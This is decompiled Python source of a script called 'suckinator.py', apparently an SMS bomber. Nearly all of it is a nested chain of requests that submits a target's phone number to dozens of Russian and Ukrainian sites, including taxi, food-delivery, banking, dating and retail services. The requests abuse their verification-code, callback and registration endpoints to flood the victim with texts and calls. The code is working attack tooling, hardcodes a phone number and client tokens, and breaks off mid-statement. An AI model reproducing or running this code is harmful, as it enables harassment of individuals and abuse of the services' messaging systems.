# decompyle3 version 3.7.5
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Aug 17 2021, 15:56:41) 
# [GCC 10.2.1 20210110]
# Embedded file name: suckinator.py
import os

def MAIN():
    try:
        import requests, random, datetime, sys, re, time, datetime, json, threading
        from threading import Thread
        from colorama import Fore, Back, Style
        from random import randint

        def Main():

            def mask(str, maska):
                if len(str) == maska.count('#'):
                    str_list = list(str)
                    for i in str_list:
                        maska = maska.replace('#', i, 1)
                    else:
                        return maska

            def sms():
                phone9 = phone[1:]
                try:
                    try:
                        phonee = mask(str=phone, maska='+# (###) ###-##-##')
                        requests.post('https://zoloto585.ru/api/bcard/reg/', json={'name':'',  'surname':'',  'patronymic':'',  'sex':'m',  'birthdate':'..',  'phone':phonee,  'email':'',  'city':''})
                    except:
                        pass
                    else:
                        try:
                            requests.post('https://3040.com.ua/taxi-ordering', data={'callback-phone': phone})
                        except:
                            pass
                        else:
                            try:
                                phonee = mask(str=(phone[1:]), maska='8(###)###-##-##')
                                requests.post('http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code', data={'phone': phonee})
                            except:
                                pass
                            else:
                                try:
                                    requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
                                except:
                                    pass
                                else:
                                    try:
                                        phonee = mask(str=phone, maska='+# (###) ###-##-##')
                                        requests.post('https://yaponchik.net/login/login.php', data={'login':'Y',  'countdown':'0',  'step':'phone',  'redirect':'/profile/',  'phone':phonee,  'code':''})
                                    except:
                                        pass
                                    else:
                                        try:
                                            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': '+' + phone})
                                        except:
                                            pass
                                        else:
                                            try:
                                                requests.post('https://api.iconjob.co/api/auth/verification_code', json={'phone': phone})
                                            except:
                                                pass
                                            else:
                                                try:
                                                    requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone})
                                                except:
                                                    pass
                                                else:
                                                    try:
                                                        requests.post('https://ng-api.webbankir.com/user/v2/create', json={'lastName':'иванов',  'firstName':'иван',  'middleName':'иванович',  'mobilePhone':phone,  'email':email,  'smsCode':''})
                                                    except:
                                                        pass
                                                    else:
                                                        try:
                                                            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={'phone': phone})
                                                        except:
                                                            pass
                                                        else:
                                                            try:
                                                                requests.post('https://b.utair.ru/api/v1/profile/', json={'phone':phone,  'confirmationGDPRDate':int(str(datetime.datetime.now().timestamp()).split('.')[0])})
                                                                requests.post('https://b.utair.ru/api/v1/login/', json={'login':phone,  'confirmation_type':'call_code'})
                                                            except:
                                                                pass
                                                            else:
                                                                try:
                                                                    phonee = mask(str=phone, maska='#(###)###-##-##')
                                                                    requests.post('https://www.r-ulybka.ru/login/form_ajax.php', data={'action':'auth',  'phone':phonee})
                                                                    phonee = mask(str=phone, maska='+#(###)###-##-##')
                                                                    requests.post('https://www.r-ulybka.ru/login/form_ajax.php', data={'phone':'+7(915)350-99-08',  'action':'sendSmsAgain'})
                                                                except:
                                                                    pass
                                                                else:
                                                                    try:
                                                                        requests.post('https://uklon.com.ua/api/v1/account/code/send', headers={'client_id': '6289de851fc726f887af8d5d7a56c635'}, json={'phone': phone})
                                                                    except:
                                                                        pass
                                                                    else:
                                                                        try:
                                                                            requests.post('https://partner.uklon.com.ua/api/v1/registration/sendcode', headers={'client_id': '6289de851fc726f887af8d5d7a56c635'}, json={'phone': phone})
                                                                        except:
                                                                            pass
                                                                        else:
                                                                            try:
                                                                                requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={'doc': {'auth': {'mphone':'+' + phone,  'bdate':'11.11.1999',  'deviceid':'00100',  'version':'1.0',  'source':'site',  'signature':'undefined'}}}, headers={'Accept': 'application/json'})
                                                                            except:
                                                                                pass
                                                                            else:
                                                                                try:
                                                                                    phonee = mask(str=phone, maska='+# (###) ###-##-##')
                                                                                    requests.post('https://www.top-shop.ru/login/loginByPhone/', data={'phone': phonee})
                                                                                except:
                                                                                    pass
                                                                                else:
                                                                                    try:
                                                                                        phonee = mask(str=phone, maska='8(###)###-##-##')
                                                                                        requests.post('https://topbladebar.ru/user_account/ajax222.php?do=sms_code', data={'phone': phonee})
                                                                                    except:
                                                                                        pass
                                                                                    else:
                                                                                        try:
                                                                                            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone})
                                                                                        except:
                                                                                            pass
                                                                                        else:
                                                                                            try:
                                                                                                requests.post('https://m.tiktok.com/node-a/send/download_link', json={'slideVerify':0,  'language':'ru',  'PhoneRegionCode':'7',  'Mobile':phone9,  'page':{'pageName':'home',  'launchMode':'direct',  'trafficType':''}})
                                                                                            except:
                                                                                                pass
                                                                                            else:
                                                                                                try:
                                                                                                    requests.post('https://thehive.pro/auth/signup', json={'phone': '+' + phone})
                                                                                                except:
                                                                                                    pass
                                                                                                else:
                                                                                                    try:
                                                                                                        requests.post(('https://msk.tele2.ru/api/validation/number/' + phone), json={'sender': 'Tele2'})
                                                                                                    except:
                                                                                                        pass
                                                                                                    else:
                                                                                                        try:
                                                                                                            phonee = mask(phone, maska='+# (###) ### - ## - ##')
                                                                                                            requests.post('https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php', data={'RECALL':'Y',  'BACK_CALL_PHONE':phone})
                                                                                                        except:
                                                                                                            pass
                                                                                                        else:
                                                                                                            try:
                                                                                                                requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', data={'action':'callback_phonenumber',  'phone':phone})
                                                                                                            except:
                                                                                                                pass
                                                                                                            else:
                                                                                                                try:
                                                                                                                    phonee = mask(str=phone, maska='(+#)##########')
                                                                                                                    requests.post('https://www.tanuki.ru/api/', json={'header':{'version':'2.0',  'userId':f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}",  'agent':{'device':'desktop',  'version':'undefined undefined'},  'langId':'1',  'cityId':'9'},  'method':{'name': 'sendSmsCode'},  'data':{'phone':phonee,  'type':1}})
                                                                                                                except:
                                                                                                                    pass
                                                                                                                else:
                                                                                                                    try:
                                                                                                                        requests.post('https://lk.tabris.ru/reg/', data={'action':'phone',  'phone':phone})
                                                                                                                    except:
                                                                                                                        pass
                                                                                                                    else:
                                                                                                                        try:
                                                                                                                            requests.post('https://tabasko.su/', data={'IS_AJAX':'Y',  'COMPONENT_NAME':'AUTH',  'ACTION':'GET_CODE',  'LOGIN':phone})
                                                                                                                        except:
                                                                                                                            pass
                                                                                                                        else:
                                                                                                                            try:
                                                                                                                                requests.post('https://www.sushi-profi.ru/api/order/order-call/', json={'phone':phone9,  'name':name})
                                                                                                                            except:
                                                                                                                                pass
                                                                                                                            else:
                                                                                                                                try:
                                                                                                                                    requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={'phone': phone})
                                                                                                                                except:
                                                                                                                                    pass
                                                                                                                                else:
                                                                                                                                    try:
                                                                                                                                        phonee = mask(str=phone9, maska='8(###)###-##-##')
                                                                                                                                        requests.post('https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code', data={'phone': phonee})
                                                                                                                                    except:
                                                                                                                                        pass
                                                                                                                                    else:
                                                                                                                                        try:
                                                                                                                                            phonee = mask(str=phone9, maska='8 (###) ###-##-##')
                                                                                                                                            requests.post('http://sushigourmet.ru/auth', data={'phone':phonee,  'stage':1})
                                                                                                                                        except:
                                                                                                                                            pass
                                                                                                                                        else:
                                                                                                                                            try:
                                                                                                                                                requests.post('https://sushifuji.ru/sms_send_ajax.php', data={'name':'false',  'phone':phone})
                                                                                                                                            except:
                                                                                                                                                pass
                                                                                                                                            else:
                                                                                                                                                try:
                                                                                                                                                    requests.get('https://auth.pizza33.ua/ua/join/check/', params={'callback':'angular.callbacks._1',  'email':email,  'password':password,  'phone':phone9,  'utm_current_visit_started':0,  'utm_first_visit':0,  'utm_previous_visit':0,  'utm_times_visited':0})
                                                                                                                                                except:
                                                                                                                                                    pass
                                                                                                                                                else:
                                                                                                                                                    try:
                                                                                                                                                        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
                                                                                                                                                    except:
                                                                                                                                                        pass
                                                                                                                                                    else:
                                                                                                                                                        try:
                                                                                                                                                            requests.get('https://suandshi.ru/mobile_api/register_mobile_user', params={'phone': phone})
                                                                                                                                                        except:
                                                                                                                                                            pass
                                                                                                                                                        else:
                                                                                                                                                            try:
                                                                                                                                                                phonee = mask(str=phone9, maska='8-###-###-##-##')
                                                                                                                                                                requests.post('https://pizzasushiwok.ru/index.php', data={'mod_name':'registration',  'tpl':'restore_password',  'phone':phonee})
                                                                                                                                                            except:
                                                                                                                                                                pass
                                                                                                                                                            else:
                                                                                                                                                                try:
                                                                                                                                                                    requests.get('https://www.sportmaster.ua/', params={'module':'users',  'action':'SendSMSReg',  'phone':phone})
                                                                                                                                                                except:
                                                                                                                                                                    pass
                                                                                                                                                                else:
                                                                                                                                                                    try:
                                                                                                                                                                        phonee = mask(str=phone, maska='+# (###) ###-##-##')
                                                                                                                                                                        requests.get('https://www.sportmaster.ru/user/session/sendSmsCode.do', params={'phone': phonee})
                                                                                                                                                                    except:
                                                                                                                                                                        pass
                                                                                                                                                                    else:
                                                                                                                                                                        try:
                                                                                                                                                                            requests.post('https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php', data={'demo_number':'+' + phone,  'ajax_demo_send':'1'})
                                                                                                                                                                        except:
                                                                                                                                                                            pass
                                                                                                                                                                        else:
                                                                                                                                                                            try:
                                                                                                                                                                                requests.post('https://smart.space/api/users/request_confirmation_code/', json={'mobile':'+' + phone,  'action':'confirm_mobile'})
                                                                                                                                                                            except:
                                                                                                                                                                                pass
                                                                                                                                                                            else:
                                                                                                                                                                                try:
                                                                                                                                                                                    requests.post('https://shopandshow.ru/sms/password-request/', data={'phone':'+' + phone,  'resend':0})
                                                                                                                                                                                except:
                                                                                                                                                                                    pass
                                                                                                                                                                                else:
                                                                                                                                                                                    try:
                                                                                                                                                                                        requests.post('https://shafa.ua/api/v3/graphiql', json={'operationName':'RegistrationSendSms',  'variables':{'phoneNumber': '+' + phone},  'query':'mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n'})
                                                                                                                                                                                    except:
                                                                                                                                                                                        pass
                                                                                                                                                                                    else:
                                                                                                                                                                                        try:
                                                                                                                                                                                            requests.post('https://shafa.ua/api/v3/graphiql', json={'operationName':'sendResetPasswordSms',  'variables':{'phoneNumber': '+' + phone},  'query':'mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n'})
                                                                                                                                                                                        except:
                                                                                                                                                                                            pass
                                                                                                                                                                                        else:
                                                                                                                                                                                            try:
                                                                                                                                                                                                requests.post('https://sayoris.ru/?route=parse/whats', data={'phone': phone})
                                                                                                                                                                                            except:
                                                                                                                                                                                                pass
                                                                                                                                                                                            else:
                                                                                                                                                                                                try:
                                                                                                                                                                                                    requests.post('https://api.saurisushi.ru/Sauri/api/v2/auth/login', data={'data': {'login':phone9,  'check':True,  'crypto':{'captcha': '739699'}}})
                                                                                                                                                                                                except:
                                                                                                                                                                                                    pass
                                                                                                                                                                                                else:
                                                                                                                                                                                                    try:
                                                                                                                                                                                                        requests.post('https://pass.rutube.ru/api/accounts/phone/send-password/', json={'phone': '+' + phone})
                                                                                                                                                                                                    except:
                                                                                                                                                                                                        pass
                                                                                                                                                                                                    else:
                                                                                                                                                                                                        try:
                                                                                                                                                                                                            requests.post('https://rutaxi.ru/ajax_auth.html', data={'l':phone9,  'c':'3'})
                                                                                                                                                                                                        except:
                                                                                                                                                                                                            pass
                                                                                                                                                                                                        else:
                                                                                                                                                                                                            try:
                                                                                                                                                                                                                requests.post('https://rieltor.ua/api/users/register-sms/', json={'phone':phone,  'retry':0})
                                                                                                                                                                                                            except:
                                                                                                                                                                                                                pass
                                                                                                                                                                                                            else:
                                                                                                                                                                                                                try:
                                                                                                                                                                                                                    requests.post('https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php', data={'phone': '+' + phone})
                                                                                                                                                                                                                except:
                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                else:
                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                        phonee = mask(str=phone, maska='+#(###)###-##-##')
                                                                                                                                                                                                                        requests.post('https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/', data={'phone':phonee,  'alien':'0'})
                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                            requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number': phone})
                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                requests.post('https://qlean.ru/clients-api/v2/sms_codes/auth/request_code', json={'phone': phone})
                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                    requests.get('https://sso.cloud.qlean.ru/http/users/requestotp', headers={'Referer': 'https://qlean.ru/sso?redirectUrl=https://qlean.ru/'}, params={'phone':phone,  'clientId':'undefined',  'sessionId':str(randint(5000, 9999))})
                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                        requests.post('https://www.prosushi.ru/php/profile.php', data={'phone':'+' + phone,  'mode':'sms'})
                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                            phonee = mask(str=phone, maska='+#-###-###-##-##')
                                                                                                                                                                                                                                            requests.post('https://api.pozichka.ua/v1/registration/send', json={'RegisterSendForm': {'phone': phonee}})
                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                phonee = mask(str=phone, maska='+# (###) ###-##-##')
                                                                                                                                                                                                                                                requests.post('https://butovo.pizzapomodoro.ru/ajax/user/auth.php', data={'AUTH_ACTION':'SEND_USER_CODE',  'phone':phonee})
                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                    phonee = mask(str=phone, maska='+# (###) ###-##-##')
                                                                                                                                                                                                                                                    requests.post('https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode', data={'phone': phonee})
                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                        requests.get('https://cabinet.planetakino.ua/service/sms', params={'phone': phone})
                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                            phonee = mask(str=phone9, maska='8-###-###-##-##')
                                                                                                                                                                                                                                                            requests.post('https://pizzasushiwok.ru/index.php', data={'mod_name':'call_me',  'task':'request_call',  'name':name,  'phone':phonee})
                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                requests.post('https://pizzasinizza.ru/api/phoneCode.php', json={'phone': phone9})
                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                    requests.post('https://pizzakazan.com/auth/ajax.php', data={'phone':'+' + phone,  'method':'sendCode'})
                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                        phonee = mask(str=phone, maska='+# (###) ###-####')
                                                                                                                                                                                                                                                                        requests.post('https://pizza46.ru/ajaxGet.php', data={'phone': phonee})
                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                            requests.post('https://piroginomerodin.ru/index.php?route=sms/login/sendreg', data={'telephone': '+' + phone})
                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                phonee = mask(str=phone, maska='+#-###-###-##-##')
                                                                                                                                                                                                                                                                                requests.post('https://paylate.ru/registry', data={'mobile':phonee,  'first_name':name,  'last_name':name,  'nick_name':name,  'gender-client':1,  'email':email,  'action':'registry'})
                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                    requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode', data={'telephone': '8' + phone9})
                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                        requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json={'phone':phone,  'otpId':0})
                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                            phonee = mask(str=phone, maska='+# (###) ###-####')
                                                                                                                                                                                                                                                                                            requests.post('https://www.osaka161.ru/local/tools/webstroy.webservice.php', data={'name':'Auth.SendPassword',  'params[0]':phonee})
                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                requests.post('https://ontaxi.com.ua/api/v2/web/client', json={'country':'UA',  'phone':phone[3:]})
                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                    requests.get('https://secure.online.ua/ajax/check_phone/', params={'reg_phone': phone})
                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                        requests.post('https://www.ollis.ru/gql',
                                                                                                                                                                                                                                                                                                          json={
                                                                                                                                                                                                                                                                                                         {'query': 'mutation { phone(number:"' + phone + '", locale:ru) { token error { code message } } }'}})
                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                            phonee = mask(str=phone9, maska='8 (###) ###-##-##')
                                                                                                                                                                                                                                                                                                            requests.get('https://okeansushi.ru/includes/contact.php', params={'call_mail':'1',  'ajax':'1',  'name':name,  'phone':phonee,  'call_time':'1',  'pravila2':'on'})
                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', data={'st.r.phone': '+' + phone})
                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                    requests.post('https://nn-card.ru/api/1.0/covid/login', json={'phone': phone})
                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                        requests.post('https://www.nl.ua', data={'component':'bxmaker.authuserphone.login',  'sessid':'bf70db951f54b837748f69b75a61deb4',  'method':'sendCode',  'phone':phone,  'registration':'N'})
                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                            requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={'REGISTER[PERSONAL_PHONE]':phone,  'code':'',  'sendsms':'Выслать код'})
                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                requests.post('https://account.my.games/signup_send_sms/', data={'phone': phone})
                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                    requests.post('https://auth.multiplex.ua/login', json={'login': phone})
                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                        requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={'msisdn': phone})
                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                            requests.post('https://www.moyo.ua/identity/registration', data={'firstname':name,  'phone':phone,  'email':email})
                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                requests.post('https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php', data={'name':name,  'phone':phone})
                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                    requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={'phone': '+' + phone})
                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                        requests.post('https://moneyman.ru/registration_api/actions/send-confirmation-code', data=('+' + phone))
                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                            requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={'FirstName':name,  'CellPhone':phone,  'Package':'optimal'})
                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                requests.post('https://mobileplanet.ua/register', data={'klient_name':name,  'klient_phone':'+' + phone,  'klient_email':email})
                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                    phonee = mask(str=phone, maska='+# (###) ### ## ##')
                                                                                                                                                                                                                                                                                                                                                                    requests.get('http://mnogomenu.ru/office/password/reset/' + phonee)
                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                        requests.get('https://my.mistercash.ua/ru/send/sms/registration', params={'number': '+' + phone})
                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                            requests.get('https://menza-cafe.ru/system/call_me.php', params={'fio':name,  'phone':phone,  'phone_number':'1'})
                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                requests.post('https://www.menu.ua/kiev/delivery/registration/direct-registration.html', data={'user_info[fullname]':name,  'user_info[phone]':phone,  'user_info[email]':email,  'user_info[password]':password,  'user_info[conf_password]':password})
                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://www.menu.ua/kiev/delivery/profile/show-verify.html', data={'phone':phone,  'do':'phone'})
                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                        phonee = mask(str=phone, maska='+# ### ### ## ##')
                                                                                                                                                                                                                                                                                                                                                                                        requests.get('https://makimaki.ru/system/callback.php', params={'cb_fio':name,  'cb_phone':phonee})
                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php', data={'data':phone,  'metod':'postreg'})
                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                requests.post('https://api-rest.logistictech.ru/api/v1.1/clients/request-code', json={'phone': phone}, headers={'Restaurant-chain': 'c0ab3d88-fba8-47aa-b08d-c7598a3be0b9'})
                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://loany.com.ua/funct/ajax/registration/code', data={'phone': phone})
                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                        requests.post('https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle', json={'url':'/api/client/phone_verification',  'method':'POST',  'data':{'client_id':5646981,  'phone':phone,  'alisa_id':1},  'headers':{'Client-Id':5646981,  'Content-Type':'application/x-www-form-urlencoded'}})
                                                                                                                                                                                                                                                                                                                                                                                                    except:
                                                                                                                                                                                                                                                                                                                                                                                                        pass
                                                                                                                                                                                                                                                                                                                                                                                                    else:
                                                                                                                                                                                                                                                                                                                                                                                                        try:
                                                                                                                                                                                                                                                                                                                                                                                                            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + phone})
                                                                                                                                                                                                                                                                                                                                                                                                        except:
                                                                                                                                                                                                                                                                                                                                                                                                            pass
                                                                                                                                                                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                                                                                                                                                            try:
                                                                                                                                                                                                                                                                                                                                                                                                                requests.post('https://koronapay.com/transfers/online/api/users/otps', data={'phone': phone})
                                                                                                                                                                                                                                                                                                                                                                                                            except:
                                                                                                                                                                                                                                                                                                                                                                                                                pass
                                                                                                                                                                                                                                                                                                                                                                                                            else:
                                                                                                                                                                                                                                                                                                                                                                                                                try:
                                                                                                                                                                                                                                                                                                                                                                                                                    requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={'Agent': 'website'}, json={'Phone':phone,  'Type':1})
                                                                                                                                                                                                                                                                                                                                                                                                                except:
                                                                                                                                                                                                                                                                                                                                                                                                                    pass
                                                                                                                                                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                                                                                                                                                    try:
                                                                                                                                                                                                                                                                                                                                                                                                                        phonee = mask(str=phone, maska='# (###) ###-##-##')
